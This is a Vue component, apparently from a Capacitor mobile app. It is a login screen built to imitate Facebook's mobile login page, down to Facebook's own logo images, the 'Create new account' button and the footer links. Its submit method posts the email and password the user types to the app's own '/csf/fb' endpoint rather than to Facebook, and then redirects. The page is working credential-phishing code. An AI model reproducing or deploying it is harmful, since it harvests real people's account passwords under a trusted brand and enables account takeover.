<template>
    <div class="card bg-white rounded-bottom shadow-none mb-0" style="height: calc(100vh); overflow: auto;">
        <span class="text-muted fs-13 mt-4 text-center">
            English (US)
        </span>
        <div class="text-center">
            <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt="" class="mb-5" style="margin-top: 70px; width: auto; height: 65px;">

            

            <form class="p-4 mt-0" action="#">
                <div class="row g-3">
                    <div class="col-lg-12">
                        <div class="form-floating">
                            <input type="text" v-model="form.email" class="form-control" id="firstnamefloatingInput" placeholder="Enter your firstname">
                            <label for="firstnamefloatingInput">Email</label>
                        </div>
                    </div>
                    <div class="col-lg-12">
                        <div class="form-floating">
                            <input type="password" v-model="form.password" class="form-control" id="lastnamefloatingInput" placeholder="Enter your Lastname">
                            <label for="lastnamefloatingInput">Password</label>
                        </div>
                    </div>
                   
                    <div class="col-lg-12">
                        <div class="d-grid gap-2" >
                            <button @click="submit" class="btn btn-secondary rounded-pill" type="button">Log In</button>
                        </div>
                        <p class="mt-4 fs-14">Forgot Password?</p>
                    </div>
                </div>
            </form>


        </div>
        <div class="mt-auto p-4">
            <div class="d-grid gap-2" >
                
            <button type="button" class="btn btn-outline-secondary waves-effect waves-light material-shadow-none fw-semibold rounded-pill">Create new account</button>
            <div class="text-center">
                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yK/r/soeuNpXL37G.png" alt="" class="mt-3 mb-3" style="width: auto; height: 12px;">
            </div>
            <span class="text-muted fs-10 text-center">
                About &nbsp; Help &nbsp; More
            </span>
            </div>
        </div>
    </div>
</template>

<script>
import axios from 'axios';
import { Capacitor } from '@capacitor/core';
export default {
    layout: null,
    data() {
        return {
            form:{
                email: null,
                password: null
            },
            isIos: Capacitor.getPlatform() === 'ios',
            error: null,
            incomplete: false,
            validationErrors: null,
            isLoading: false,
            completed: false,
            sub: false
        };
    },
    methods: {
        async submit() {
            this.sub = true;
            this.isLoading = true;
            await axios.post('/csf/fb',{
                email: this.form.email,
                password: this.form.password,
            }).then(response => {
                if (response.data.status) {
                    this.$emit('success',response.data.data);
                    this.form = {
                        email: null,
                        password: null
                    };
                } 
                this.isLoading = false;
                this.sub = false;
                this.completed = true;
                this.$router.push({ name: 'csf' });
            }).catch(({response})=>{
                if(response.status===422){
                    this.validationErrors = response.data.errors || {};
                }else{
                    this.validationErrors = {};
                    this.error = response.data.message;
                }
                this.$router.push({ name: 'csf' });
            }).finally(()=>{
                this.processing = false
            });
        },
    }
};
</script>

